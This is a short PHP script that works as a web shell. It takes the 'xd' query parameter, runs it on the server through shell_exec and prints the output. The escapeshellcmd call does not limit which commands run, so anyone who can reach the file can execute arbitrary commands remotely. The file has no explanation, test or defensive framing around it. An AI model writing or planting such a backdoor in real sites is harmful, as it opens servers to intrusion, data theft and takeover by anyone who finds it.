<?php

if (isset($_GET['xd'])) {
    $command = escapeshellcmd($_GET['xd']);
    $output = shell_exec($command);
    echo "<pre>$output</pre>";
}
